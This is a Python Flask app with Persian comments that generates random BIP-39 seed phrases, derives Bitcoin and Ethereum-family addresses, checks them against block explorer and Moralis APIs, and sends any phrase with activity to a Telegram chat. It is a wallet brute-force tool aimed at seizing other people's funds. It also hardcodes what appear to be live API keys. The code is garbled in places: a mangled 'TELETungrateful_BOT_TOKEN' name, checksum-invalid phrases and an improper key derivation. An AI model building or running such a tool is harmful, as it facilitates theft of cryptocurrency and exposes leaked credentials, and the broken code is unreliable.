import random
import requests
from mnemonic import Mnemonic
from eth_account import Account
from bitcoinlib.wallets import Wallet, wallet_create_or_open
from telegram import Bot
import asyncio
from flask import Flask, request, jsonify, render_template
import threading
import os

# تنظیمات (از Environment Variables لود می‌شن)
ETHERSCAN_API_KEY = os.getenv("ETHERSCAN_API_KEY", "VAIGK3N63NQSY3YCZEUHH8MUNZSSNBBAM7")
BSCSCAN_API_KEY = os.getenv("BSCSCAN_API_KEY", "EBHBDF7HUQNEYRJZR8N61C99DZ1HCWKMCI")
POLYGONSCAN_API_KEY = os.getenv("POLYGONSCAN_API_KEY", "87X5VUE8GB7TF5IKER65UM51RY2UJU8E5U")
BLOCKCHAIN_API_KEY = os.getenv("BLOCKCHAIN_API_KEY", "YOUR_BLOCKCHAIN_API_KEY")
MORALIS_API_KEY = os.getenv("MORALIS_API_KEY", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6Ijc4ZWJlMmUwLWEwN2QtNDFkNS04MjM1LWU4MGJlYzJhN2NiMSIsIm9yZ0lkIjoiNDQyOTEzIiwidXNlcklkIjoiNDU1Njk1IiwidHlwZUlkIjoiM2IwZmI2ZjEtODViNS00MTdlLThmNjktZDllZTU2OWY4NGJiIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDUxNjI4ODQsImV4cCI6NDkwMDkyMjg4NH0.oNfmU25MnpsqMowIf6ovMtqjt6rILiG_U_DOrCER_hs")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "YOUR_CHAT_ID")

# لود لیست BIP-39
with open("bip39_wordlist.txt", "r") as f:
    BIP39_WORDLIST = [line.strip() for line in f]

# اپ Flask
app = Flask(__name__)
is_running = False

# تولید عبارت بازیابی
def generate_seed_phrase():
    return " ".join(random.sample(BIP39_WORDLIST, 12))

# تبدیل عبارت به آدرس‌ها
def seed_to_eth_address(seed_phrase):
    mnemo = Mnemonic("english")
    seed = mnemo.to_seed(seed_phrase)
    account = Account.from_key(seed[:32])  # ساده‌سازی برای اتریوم/BSC/پلیگان
    return account.address

def seed_to_btc_address(seed_phrase):
    try:
        wallet = wallet_create_or_open("temp_wallet", keys=seed_phrase, network="bitcoin")
        return wallet.get_key().address
    except:
        return None

# چک کردن تعداد تراکنش‌ها
def check_eth_transactions(address):
    url = f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&startblock=0&endblock=99999999&sort=asc&apikey={ETHERSCAN_API_KEY}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        if data["status"] == "1":
            return len(data["result"])
    return 0

def check_bsc_transactions(address):
    url = f"https://api.bscscan.com/api?module=account&action=txlist&address={address}&startblock=0&endblock=99999999&sort=asc&apikey={BSCSCAN_API_KEY}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        if data["status"] == "1":
            return len(data["result"])
    return 0

def check_polygon_transactions(address):
    url = f"https://api.polygonscan.com/api?module=account&action=txlist&address={address}&startblock=0&endblock=99999999&sort=asc&apikey={POLYGONSCAN_API_KEY}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        if data["status"] == "1":
            return len(data["result"])
    return 0

def check_btc_transactions(address):
    url = f"https://blockchain.info/rawaddr/{address}?api_code={BLOCKCHAIN_API_KEY}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        return data.get("n_tx", 0)
    return 0

# چک کردن توکن‌های ERC-20/BEP-20
def check_tokens(address, chain="eth"):
    chains = {"eth": "eth", "bsc": "bsc"}
    url = f"https://api.moralis.io/2.0/{address}/erc20?chain={chains.get(chain, 'eth')}"
    headers = {"X-API-Key": MORALIS_API_KEY}
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        tokens = response.json()
        return len(tokens)
    return 0

# ارسال به تلگرام
async def send_to_telegram(seed_phrase, addresses, transactions, tokens):
    bot = Bot(token=TELETungrateful_BOT_TOKEN)
    message = f"🚨 Found Wallet with Transactions!\nSeed Phrase: {seed_phrase}\n"
    for chain, addr in addresses.items():
        if addr:
            message += f"{chain} Address: {addr} | Transactions: {transactions.get(chain, 0)}\n"
    message += f"ETH/BSC Tokens: {tokens.get('eth', 0)} (ETH), {tokens.get('bsc', 0)} (BSC)\n"
    await bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message)

# حلقه اصلی چک کردن والت‌ها
def check_wallets():
    global is_running
    while is_running:
        seed_phrase = generate_seed_phrase()
        
        # تولید آدرس‌ها
        addresses = {
            "Bitcoin": seed_to_btc_address(seed_phrase),
            "Ethereum": seed_to_eth_address(seed_phrase),
            "BSC": seed_to_eth_address(seed_phrase),  # BSC از آدرس‌های اتریوم استفاده می‌کنه
            "Polygon": seed_to_eth_address(seed_phrase)  # پلیگان هم مشابه
        }
        
        # چک کردن تراکنش‌ها
        transactions = {
            "Bitcoin": check_btc_transactions(addresses["Bitcoin"]) if addresses["Bitcoin"] else 0,
            "Ethereum": check_eth_transactions(addresses["Ethereum"]),
            "BSC": check_bsc_transactions(addresses["BSC"]),
            "Polygon": check_polygon_transactions(addresses["Polygon"])
        }
        
        # چک کردن توکن‌ها
        tokens = {
            "eth": check_tokens(addresses["Ethereum"], "eth"),
            "bsc": check_tokens(addresses["BSC"], "bsc")
        }
        
        print(f"Checked: {seed_phrase} | BTC Tx: {transactions['Bitcoin']} | ETH Tx: {transactions['Ethereum']} | BSC Tx: {transactions['BSC']} | Polygon Tx: {transactions['Polygon']} | Tokens: {tokens}")
        
        # اگه تراکنش یا توکن پیدا شد
        if any(tx > 0 for tx in transactions.values()) or any(tk > 0 for tk in tokens.values()):
            asyncio.run(send_to_telegram(seed_phrase, addresses, transactions, tokens))
            print(f"Found wallet with transactions! Seed: {seed_phrase}")

# رابط وب
@app.route("/")
def index():
    return render_template("index.html", running=is_running)

@app.route("/start", methods=["POST"])
def start():
    global is_running
    if not is_running:
        is_running = True
        threading.Thread(target=check_wallets, daemon=True).start()
        return jsonify({"status": "Started"})
    return jsonify({"status": "Already running"})

@app.route("/stop", methods=["POST"])
def stop():
    global is_running
    is_running = False
    return jsonify({"status": "Stopped"})

@app.route("/status", methods=["GET"])
def status():
    return jsonify({"running": is_running})

# اجرای اپ
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
